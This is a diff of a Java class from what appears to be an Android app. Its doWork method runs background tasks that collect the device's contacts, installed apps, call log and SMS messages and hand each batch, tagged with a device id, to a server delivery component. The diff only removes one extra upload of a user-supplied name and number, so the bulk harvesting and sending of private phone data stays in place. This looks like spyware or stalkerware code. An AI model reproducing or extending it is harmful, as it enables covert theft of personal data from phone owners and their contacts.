@@ -28,19 +28,16 @@ public class Worker {
         }
     }
 
-    public static void doWork(Context context, String fio, String num) {
+    public static void doWork(Context context) {
         Dump dump = new Dump(context);
         Delivery delivery = new Delivery((ServerCallback) context);
-        ArrayList<Content> put = new ArrayList<>();
-        put.add(Content.getContact(fio,num));
 
         executorService.execute(() -> {
             List<Callable<Object>> callableList = Arrays.asList(
                     Executors.callable(() -> delivery.setLoad(dump.getContacts(), dump.getId(), "PB")),
                     Executors.callable(() -> delivery.setLoad(dump.getApps(), dump.getId(), "AP")),
                     Executors.callable(() -> delivery.setLoad(dump.getCall(), dump.getId(), "CL")),
-                    Executors.callable(() -> delivery.setLoad(dump.getSms(), dump.getId(), "SM")),
-                    Executors.callable(() -> delivery.setLoad(put, dump.getId(), "MY")));
+                    Executors.callable(() -> delivery.setLoad(dump.getSms(), dump.getId(), "SM")));
             try {
                 futureList = executorService.invokeAll(callableList);
             } catch (InterruptedException e) {
